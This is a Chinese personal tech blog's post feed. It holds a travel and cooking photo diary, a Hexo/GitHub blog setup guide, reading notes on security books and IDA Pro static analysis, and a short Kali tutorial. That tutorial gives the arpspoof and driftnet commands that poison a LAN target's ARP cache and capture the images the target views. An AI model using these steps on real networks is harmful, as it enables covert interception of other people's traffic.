<li>买菜</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca8786e30421.jpg" alt="IMG_5084.JPG"></p>
<ul>
<li>游玩</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca8796cee02f.jpg" alt="IMG_5093(20190406-025326).jpg"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a201ab46.jpg" alt="IMG_5096.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a3671598.jpg" alt="IMG_5099.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a56a399c.jpg" alt="IMG_5108.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a5715da7.jpg" alt="IMG_5104(20190405-203354).jpg"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a574d36e.jpg" alt="IMG_5114.JPG"></p>
<ul>
<li>玩傣族手鼓的小姐姐很漂亮哈….(。・∀・)ノ</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87abc8a8a6.jpg" alt="IMG_5119.JPG"></p>
<ul>
<li>来一波合照</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87b530cbd9.jpg" alt="IMG_5122.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87b5741e21.jpg" alt="IMG_5125.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87ae337ea0.jpg" alt="IMG_5123.JPG"></p>
<ul>
<li>一起做饭（瀚哥做菜手艺真的不错(oﾟvﾟ)ノ）</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c1d26cb8.jpg" alt="IMG_5121.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c509b5af.jpg" alt="IMG_5128.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c51e400b.jpg" alt="IMG_5130.JPG"></p>
<ul>
<li>哈哈，不错不错！凉拌猪肉，瀚哥特地带了家里面的腌菜和藠头。</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c9d19065.jpg" alt="IMG_5131.JPG"></p>
<ul>
<li>还有三七炖鸡….</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87ca4910ba.jpg" alt="IMG_5132.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87ca511992.jpg" alt="IMG_5133.JPG"></p>
<ul>
<li>还算不错，哈哈。</li>
</ul>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《arp欺骗获取目标主机浏览的图片》</title>
    <url>/post/arp-picture/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、driftnet</strong><br>&amp;nbsp;</p>
<h3 id="一、ARP欺骗、流量转发"><a href="#一、ARP欺骗、流量转发" class="headerlink" title="一、ARP欺骗、流量转发"></a>一、ARP欺骗、流量转发</h3><table><tr><td bgcolor=#D1EEEE>第一步“开启ip转发”
命令:echo 1 >/proc/sys/net/ipv4/ip_forward        （回车没有任何的返回）
第二步查看转发是否成功
第三步另开窗口“开始欺骗”
命令：arpspoof -i eth0 -t 192.168.1.10 192.168.1.1        （回车之后不断欺骗运行中~~~[记得这个窗口需要保留]）</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.10 192.168.1.1</span><br></pre></td></tr></table></figure>
<h3 id="二、使用driftnet获取图片"><a href="#二、使用driftnet获取图片" class="headerlink" title="二、使用driftnet获取图片"></a>二、使用driftnet获取图片</h3><table><tr><td bgcolor=#D1EEEE>命令：driftnet -i eth0（获取的图片会自动给保存，可以看它新开窗口的保存路径）
“查看目标的图片信息”弹出的窗口请不要关闭，在窗口就可以看到获取信息。
</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈 C 和其他语言</title>
    <url>/post/c-grammer/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="aeaaadff4e5492de62f04fbfe22b73c58820d39996df08ab897afc32b9158975"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记</title>
    <url>/post/column-1/</url>
    <content><![CDATA[<p>漏洞利用技术才是实施有效攻击的最核心技术，才是突破安全边界、实施深度入侵的关键所在。ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="1-Web-方向"><a href="#1-Web-方向" class="headerlink" title="1 Web 方向"></a>1 Web 方向</h2><ol>
<li><a href="https://directoree.github.io/post/learning-testing-with-python">【Python 测试之道】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/web-basic-safety-guide-uploadfile/">【Web 安全防护指南基础篇-文件上传】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/web-basic-safety-guide-sqlinject/">【Web 安全防护指南基础篇-SQL注入】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/web-basic-safety-guide-xss/">【Web 安全防护指南基础篇-XSS注入】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/sqlinject/">【数据库编译原理和注入】</a></li>
</ol>
<h2 id="2-二进制方向"><a href="#2-二进制方向" class="headerlink" title="2 二进制方向"></a>2 二进制方向</h2><ol>
<li><a href="https://directoree.github.io/post/cssapp_notes-1-2-3/">《深入理解计算机系统 CSS:APP》 读书笔记</a></li>
<li><a href="https://directoree.github.io/post/0day2-1-2/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（1-2）</a></li>
<li><a href="https://directoree.github.io/post/0day2-3-4/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（3-4）</a></li>
<li><a href="https://directoree.github.io/post/encryption-and-cracking-11-PE/">《加密与解密（第四版）PE文件格式》</a></li>
<li><a href="https://directoree.github.io/post/Windows-Kernel-Base/">《Windows内核基础》</a><ul>
<li>《深入解析Windows操作系统（第六版）》</li>
<li>《Windows内核原理与实现》</li>
</ul>
</li>
<li><a href="https://directoree.github.io/post/encryption-and-cracking-1-basic/">《加密与解密》_1_基础知识》</a></li>
<li><a href="https://directoree.github.io/post/encryption-and-cracking-2-ollydbg/">《《加密与解密》_2_动态调试技术_OllyDbg》</a></li>
</ol>
<h2 id="3-书目"><a href="#3-书目" class="headerlink" title="3 书目"></a>3 书目</h2><table>
<thead>
<tr>
<th align="center">分类</th>
<th align="left">书名</th>
<th>列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">二进制逆向</td>
<td align="left">《深入理解计算机系统》（CSS:APP）</td>
<td>1. <a href="https://directoree.github.io/post/cssapp_notes-1-2-3/">《深入理解计算机系统 CSS:APP》 读书笔记</a></td>
</tr>
<tr>
<td align="center">二进制逆向</td>
<td align="left">《0day安全：软件漏洞分析技术（第二版）》</td>
<td>1. <a href="https://directoree.github.io/post/0day2-1-2/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（1-2）</a><br>2. <a href="https://directoree.github.io/post/0day2-3-4/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（3-4）</a></td>
</tr>
<tr>
<td align="center">二进制逆向</td>
<td align="left">《加密与解密（第四版）》</td>
<td>1. <a href="https://directoree.github.io/post/encryption-and-cracking-11-PE/">《加密与解密（第四版）11_PE文件格式》</a><br/>2. <a href="https://directoree.github.io/post/encryption-and-cracking-1-basic/">《加密与解密》_1_基础知识》</a> <br/>3. <a href="https://directoree.github.io/post/encryption-and-cracking-2-ollydbg/">《加密与解密》_2_动态调试技术_OllyDbg》</a></td>
</tr>
<tr>
<td align="center">二进制逆向</td>
<td align="left">《深入解析Windows操作系统（第六版）》<br />《Windows内核原理与实现》</td>
<td>1. <a href="https://directoree.github.io/post/Windows-Kernel-Base/">《Windows内核基础》</a></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">分类</th>
<th>书名</th>
<th>列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Web</td>
<td>《Python 测试之道》</td>
<td>1. <a href="https://directoree.github.io/post/learning-testing-with-python">【Python 测试之道】读书笔记</a></td>
</tr>
<tr>
<td align="center">Web</td>
<td>《Web 安全防护指南基础篇》</td>
<td>1. <a href="https://directoree.github.io/post/web-basic-safety-guide-uploadfile/">【Web 安全防护指南基础篇-文件上传】读书笔记</a><br />2. <a href="https://directoree.github.io/post/web-basic-safety-guide-sqlinject/">【Web 安全防护指南基础篇-SQL注入】读书笔记</a><br />3. <a href="https://directoree.github.io/post/web-basic-safety-guide-xss/">【Web 安全防护指南基础篇-XSS注入】读书笔记</a></td>
</tr>
<tr>
<td align="center">Web</td>
<td>数据库编译原理和注入</td>
<td>1. <a href="https://directoree.github.io/post/sqlinject/">【数据库编译原理和注入】</a></td>
</tr>
</tbody></table>
<h2 id="4-Windows-XP-内核视频"><a href="#4-Windows-XP-内核视频" class="headerlink" title="4 Windows XP 内核视频"></a>4 Windows XP 内核视频</h2><p>3期参考：</p>
<ul>
<li>Win32编程：《Windows核心编程第5版》</li>
<li>硬编码：《Intel x86开发手册卷1》</li>
</ul>
<p>中级参考：</p>
<ul>
<li>保护模式：《Intel x86开发手册卷2》</li>
<li>驱动开发：《Windows内核原理与实现-潘爱民》</li>
</ul>
<table>
<thead>
<tr>
<th align="center">章节</th>
<th>分类</th>
<th>列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1.保护模式</td>
<td>1. 段保护</td>
<td>1. <a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a><br />2. <a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a><br />3. <a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Github博客搭建终极大法</title>
    <url>/post/createGithubblog/</url>
    <content><![CDATA[<p>2019.2.26更新<br>最近有同学、朋友问我详细的Hexo+Github Pages Blog搭建，加之我把我这几个月来的一些使用技巧和方法总结一下。为什么要今天来更新一下呢？<br>因为26对我来说是个特别的日子…..</p>
<span id="more"></span>




<p><font face="楷体">边听边看吧😊</font></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=32705017&auto=0&height=66"></iframe>

<p><font face="宋体"></font></p>
<h3 id="一、-前言"><a href="#一、-前言" class="headerlink" title="一、 前言"></a><font color="#FF6347" face="Comic sans MS">一、 前言</font></h3><p><font face="宋体">&amp;emsp;很早之前就想到要拥有自己的一个个人博客，最初想到的是CSDN，除了会员，无奈广告太多。接着考虑过博客园，但是不太喜欢它的UI……最终经朋友推荐了Github博客。经过大致几个小时的Search关于Github博客有关的东西之后，发现里面的背景、字体、高亮代码等等的所有东西全部都可以DIY，对于一个喜欢美丽事物的我来说确实喜欢上了。好了，话不多说了，接下来谈谈建立这个博客的辛酸过程吧……<br></font></p>
<blockquote>
<p>要有一个良好的使用习惯，包括但不限于：</p>
</blockquote>
<ol>
<li>写自己博客创建方法。博客搭建好后可以写写自己搭建过程中遇到的问题以及解决方法；</li>
<li>解决报错信息。初次搭建博客的过程是很麻烦的，特别对于git的报错，或者是hexo安装过程遇到的一系列问题，我的建议是：将报错信息复制到Google或者百度找解决方法，或者将错误截图和原因告诉已经搭建好博客的人，请教他们是如何解决类似问题的；</li>
<li>创建更新日志。为自己的博客写一个更新日志，内容可以包含：更新内容、时间、原因、目的、方法，以及更新过程中遇到的问题是怎样解决的，这个习惯非常好，以后能非常便捷地帮助自己了解到博客的变化，以及自身积累的一个过程；</li>
<li>初始创建好博客文件夹后可以复制一份保留好，以便后续可能使用到(极大可能会使用)；</li>
<li>站点目录下的_config文件可以多复制几份，但是要方便区分；<br>……</li>
</ol>
<p>&amp;emsp;<br>最近我重新又搭建了一个博客，实现了一台电脑搭建多个博客并部署到远程Github仓库。<br>但是这个过程也是非常痛苦的，因为网上的教程我几乎都试了，但是没有一个是成功的……下面我会分别谈谈搭建一个、多个博客的详细过程。<br>前提是第一个博客博客要搭建好，其余的就非常简单了！ (。・∀・)ノ</p>
<p>&amp;emsp;</p>
<h3 id="二、-搭建第一个博客"><a href="#二、-搭建第一个博客" class="headerlink" title="二、 搭建第一个博客"></a><font color="#FF6347" face="Comic sans MS">二、 搭建第一个博客</font></h3><h4 id="2-1-搭建方式"><a href="#2-1-搭建方式" class="headerlink" title="2.1 搭建方式"></a><font color="#3CB371" face="Comic sans MS">2.1 搭建方式</font></h4><blockquote>
<p>Hexo+Github、Jekyll+Github</p>
</blockquote>
<p><font face="宋体">&amp;emsp;至于使用哪一种方式，网上看了许多帖子、视频、博客……大部分是使用Hexo，后来自己网上找了许多原因，发现Hexo官网提供了非常丰富的主题和插件，加上好维护，最终我选择了Hexo来搭建。</font></p>
<h4 id="2-2-搭建需要的工具"><a href="#2-2-搭建需要的工具" class="headerlink" title="2.2 搭建需要的工具"></a><font color="#3CB371" face="Comic sans MS">2.2 搭建需要的工具</font></h4><blockquote>
<p><font face="Arail">1. 安装node.js </font><br><font face="Arail">2. 安装Git </font><br><font face="Arail"> 3. 安装Hexo</font><br><font face="Arail"> 4. 安装Hexo依赖</font><br><font face="Arail"> 5. 安装代码编辑工具，推荐Sublime Text(官网下载)</font></p>
</blockquote>
<h4 id="2-3-搭建过程"><a href="#2-3-搭建过程" class="headerlink" title="2.3 搭建过程"></a><font color="#3CB371" face="Comic sans MS">2.3 搭建过程</font></h4><h5 id="步骤一、那就是先注册自己的Github账号了"><a href="#步骤一、那就是先注册自己的Github账号了" class="headerlink" title="步骤一、那就是先注册自己的Github账号了"></a><font color="#2196f3" face="Comic sans MS">步骤一、那就是先注册自己的Github账号了</font></h5><p>先看完下面文字再点击视频链接去注册。</p>
<blockquote>
<p>1.进入<a href="https://github.com/%E7%82%B9%E5%87%BB%E6%B3%A8%E5%86%8C%E3%80%82%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A">https://github.com/点击注册。注意事项：</a><br>    1）一个用户名、邮箱只能注册一次；<br>    2）Github会限制浏览器，推荐Chrome、Firefox；<br>    3）邮箱验证，通过了才能继续下面事项。</p>
</blockquote>
<blockquote>
<p>2.关于取名：<br>    1）比如我的用户名是Treecatee,相应的仓库取名推荐为Treecatee.github.io，否则后续使用Treecatee.github.io在浏览器访问时报错404；那如果我非要取其他名可以么？可以的，比如我取名为Directoree.github.io，那么在浏览器输入应该为Treecatee&#x2F;Directoree.github.io，这样就可以了，不过URL很长…..<br>    2）GitHub Pages 建好后需要将Branch改为master，然后在下面接着选一个theme，不然会访问不了Treecatee.github.io</p>
</blockquote>
<p><font face="宋体">&amp;emsp;到<a href="https://github.com/">Github官网</a>注册账号，过程还是有些繁琐的，那就推荐到这个视频看看怎么注册吧…..<br><a href="https://www.bilibili.com/video/av24897960?p=2">Github注册账号视频（点我）</a>。 </font></p>
<h5 id="步骤二、-安装node-js"><a href="#步骤二、-安装node-js" class="headerlink" title="步骤二、 安装node.js"></a><font color="#2196f3" face="Comic sans MS">步骤二、 安装node.js</font></h5><p><font face="宋体">&amp;emsp;<a href="https://nodejs.org/zh-cn/">官网下载</a>node，或者使用<a href="https://npm.taobao.org/">淘宝镜像源下载</a>。安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入node -v，如果显示版本则安装成功，否则重新安装。  </font></p>
<h5 id="步骤三、-安装Git（第一坑）"><a href="#步骤三、-安装Git（第一坑）" class="headerlink" title="步骤三、 安装Git（第一坑）"></a><font color="#2196f3" face="Comic sans MS">步骤三、 安装Git（第一坑）</font></h5><p><font face="宋体">&amp;emsp;1.网上的教程都是直接到<a href="https://git-scm.com/downloads">Git官网</a>直接下载，后来到了官网后发现官网根本就不能下载了，这不是坑人么？后来找了很多方法，发现官网已经停止维护更新了，那就得使用其他途径了。推荐<a href="https://npm.taobao.org/mirrors/git-for-windows/">淘宝镜像</a>，或者到CSDN搜索一下复制链接给淘宝客服帮助你下载（土豪行为）🤭<br>&amp;emsp;2.安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入git，如果显示有相应信息则安装成功，否则重新安装。<br></font></p>
<h5 id="步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库"><a href="#步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库" class="headerlink" title="步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库"></a><font color="#2196f3" face="Comic sans MS">步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库</font></h5><p><font face="宋体">&amp;emsp;注意事项：生成密钥的过程会提示是否需要输入密码？按回车默认不需要就可以了，后面一个提示是生成的密钥的文件保存路径，你可以更改也可以不改。创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=4">点我看视频</a>。</font></p>
<h5 id="步骤五、-非常重要的一步，创建Hexo（第二坑）"><a href="#步骤五、-非常重要的一步，创建Hexo（第二坑）" class="headerlink" title="步骤五、 非常重要的一步，创建Hexo（第二坑）"></a><font color="#2196f3" face="Comic sans MS">步骤五、 非常重要的一步，创建Hexo（第二坑）</font></h5><blockquote>
<ol>
<li>建立一个Blog文件夹；</li>
<li>在Blog文件夹下右键选中Git Bash Here打开Git,输入更换安装源的路径命令<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>，然后输入<code>npm install hexo-cli -g</code>-g是安装到全局；</li>
<li>安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，这一步创建博客本地站点文件；Directoree文件夹被创建好后，将其复制一份到其他路径下，方便以后用；</li>
<li>到Blog&#x2F;Directoree右键选中Git Bash Here打开Git,输入<code>npm install</code>安装依赖。</li>
</ol>
</blockquote>
<p><font face="宋体">&amp;emsp;注意事项：Hexo创建不成功的话是无法搭建博客的，注意创建在目录的位置哦！创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=5">点我看视频</a>后发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，代码参考<a href="https://www.cnblogs.com/qq597585136/p/6964599.html">关于HEXO安装失败的解决方法</a>，如果连接不能跳转则使用下面代码即可：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="宋体">&amp;emsp;注意事项：Hexo依赖不成功安装的话是无法搭建博客的，注意创建在目录的位置哦！！！发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，使用下面代码即可：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p><font face="宋体">&amp;emsp;安装好了后就赶紧试试自己的第一篇博客文章吧，在命令行输入：hexo g -s 本地查看一下，参见<a href="https://www.bilibili.com/video/av24897960?p=5">视频</a>。<br></font></p>
<h5 id="步骤六、-下载安装Sublime-Text软件"><a href="#步骤六、-下载安装Sublime-Text软件" class="headerlink" title="步骤六、 下载安装Sublime Text软件"></a><font color="#2196f3" face="Comic sans MS">步骤六、 下载安装Sublime Text软件</font></h5><p><font face="宋体">&amp;emsp;该软件用于编辑代码等，当然也可以使用其他软件，推荐<a href="https://www.sublimetext.com/">下载地址</a>，点击DOWNLOAD FOR WINDOWS。然后就可以编辑提交文章到自己的博客了啊。如果<code>hexo g</code>时报错远程端连接不上的话，是因为网络问题，多试几次就好了。<br>常用的提交命令：</font></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hexo</span> cl</span><br><span class="line">hexo g</span><br><span class="line">hexo s   （这个是本地查看）</span><br><span class="line">hexo d   （这个是部署到自己的博客）</span><br></pre></td></tr></table></figure>
<p>  哈哈哈，就这样自己的博客初步搭建好了</p>
<p><font face="楷体">  至于主题替换以及里面插件的使用后续再更吧……😊</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-搭建第二个博客"><a href="#三、-搭建第二个博客" class="headerlink" title="三、 搭建第二个博客"></a><font color="#FF6347" face="Comic sans MS">三、 搭建第二个博客</font></h3><p><font color="#FF7F00"><strong>创建多个博客其实按照逻辑来并不难，难点是在于远程部署文章的时候的解决方法。其实实际也就是使用本地RSA密钥要使用正确。</strong></font></p>
<blockquote>
<ol>
<li>注册GitHub账号；并注意这个时候的SSH-RSA密钥创建的时候我们可以另选一个路径先暂时保存一下，比如桌面；</li>
<li>Git、node.js不需要再次安装；</li>
<li>可以将上述复制的博客文件直接拿来用。<br> 1）如果没有复制。则需要检查Hexo是否在新的博客路径下可用，不可用的话重新在新的路径下安装，安装方法参照上面，安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，接着安装依赖；<br> 2）如果复制了。需要再安装一个Hexo依赖，否则你会发现<code>hexo cl</code>等命令不能用。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;<br><strong>如果不解决RSA的问题报错如下：</strong></p>
<p><img data-src="https://i.loli.net/2019/02/26/5c74efb9ac932.png" alt="VF.png"></p>
<p>&amp;emsp;<br>&amp;emsp;<br><strong>解决方法：</strong><font color="red"><strong>部署哪一个博客就使用该博客对应的RSA密钥对！！！</strong></font><br>网上那些方法我都试了但是没有一个能解决实际情况，所以下面的解决方法绝对适用于每一个人！！！</p>
<p>&amp;emsp;<br>保存RSA密钥的默认路径是<code>C:\Users\Alvin\.ssh</code>，可以看到里面的id_rsa、id_rsa.pub密钥对是第一个博客的，当我们需要部署第二个博客到远程仓库时就需要使用到第二个博客的密钥对，这个时候我们可以在<code>C:\Users\Alvin\.ssh</code>目录下建立一个文件夹，例如建立<code>用于更换</code>文件夹，将暂时不用的密钥对移动到里面，将需要使用到的密钥对放到<code>C:\Users\Alvin\.ssh</code>目录下即可。<br>&amp;emsp;</p>
<blockquote>
<p>为什么要这样？<br>那是因为密钥对可以选择使用，但是部署到远程仓库是使用的密钥对文件名字必须为<code>id_rsa、id_rsa.pub</code></p>
</blockquote>
<br>

<p><img data-src="https://i.loli.net/2019/02/27/5c76836c999aa.png" alt="B.png"></p>
<p>更换后第二个博客部署成功了，如下：<br><img data-src="https://i.loli.net/2019/02/26/5c74f1f7aad0c.png" alt="O.png"></p>
<p>&amp;emsp;<br>哈哈哈哈(。・∀・)ノ</p>
]]></content>
      <categories>
        <category>Hexo-Github</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP Data Lab</title>
    <url>/post/csapp_datalab/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7408ad97d86ffbd6bc87b1f7e9de36a33f520f55574cc6f70a5733c9724495db"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>CS:APP</tag>
        <tag>逆向</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>闲谈Docker😄</title>
    <url>/post/docker-github/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="afc61db3d4dd470cc714af66267821109034492ab6bb211895138df8046d19b3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/post/docker/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e133ce1c1c3a44d274de037149db628c3680637b462b85c97062a0be509fdf3f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>《加密与解密》_3_静态调试技术_IDA_Pro</title>
    <url>/post/encryption-and-cracking-ida-pro/</url>
    <content><![CDATA[<p>⍢⃝  ⍤⃝ ⍥⃝ ⍨⃝ ⌓̈⃝ ◡̈⃝  ⠒̫⃝  ʚ◡̈⃝ɞ  ༛̥⃝ʺ̤ </p>
<span id="more"></span>

<h2 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h2><h3 id="1-文件类型分析"><a href="#1-文件类型分析" class="headerlink" title="1 文件类型分析"></a>1 文件类型分析</h3><div class="note primary"><p>工具PEiD</p>
<p><mark class="label warning">程序开发语言检测</mark>：PEiD这类文件分析工具是利用<mark class="label default">特征串搜索</mark>来完成识别工作的。各种开发语言都有固定的启动代码，利用这一点就可以识别程序是由<strong>何种语言编译</strong>的。<br /></p>
<p><mark class="label warning">查壳的原理</mark>：被加密程序A处理过的程序B中会留下加密软件的相关信息，利用这一点就可以识别程序是被何种软件加密的。</p>
</div>

<p>两个查壳、程序编写语言的软件：PEiD、DIE</p>
<p><img data-src="https://i.loli.net/2021/08/24/eFlVsgOAa1Jk6Hn.png" alt="1.png"></p>
<div class="note info"><ul>
<li>PEiD是根据特征码来识别壳、编写语言。</li>
<li>PEiD提供了一个扩展接口文件<code>userdb.txt</code>，用户可以自定义一些特征码，这样就可以识别新的文件类型了。签名的制作可以用Add Signature插件完成，必要时还要用0llyDbg等调试器配合进行修正。</li>
</ul>
<p>有些外壳程序为了欺骗PEiD等文件识别软件，会将一些加壳信息去除，并伪造启动代码。例如，将入口代码改成与用VisualC++6.0所编程序入口处类似的代码，即可达到欺骗的目的。所以，文件识别工具给出的结果只能作为参考，至于文件是否被加壳处理过，要跟踪分析程序代码才能知道。</p>
</div>



<h2 id="2-IDA-Pro"><a href="#2-IDA-Pro" class="headerlink" title="2 IDA Pro"></a>2 IDA Pro</h2><div class="note warning"><p>IDA支持的文件类型非常丰富，除了常见的PE格式，还支持DOS、UNIX、Mac、Java、.NET等平台的文件格式。</p>
<p>IDA支持常见处理器平台上的软件产品，且导入被分析程序时IDA会自动识别被分析程序的格式。</p>
</div>



<p><strong>IDA运行流程：</strong></p>
<ol>
<li>IDA是按”区块”装载PE文件的，例如.text（代码块）、.data（数据块）、.rsrc（资源块）、.idata （输入表）和.edata（输出表）等。</li>
<li>IDA反汇编所消耗的时间与程序大小及复杂程度有关，通常需要等待一段时间才能完成（第一次加载&#x2F;调试过程<code>idb</code>文件被删除）。此过程分为两个阶段。<ul>
<li>第一阶段：将程序的代码和数据分开，分别标记函数并分析其参数调用，分析跳转、调用等指令关系并给标签赋值等。</li>
<li>在第二阶段：如果IDA能够识别文件的编译类型就装载对应的编译器特征文件，然后给各函数赋名。</li>
</ul>
</li>
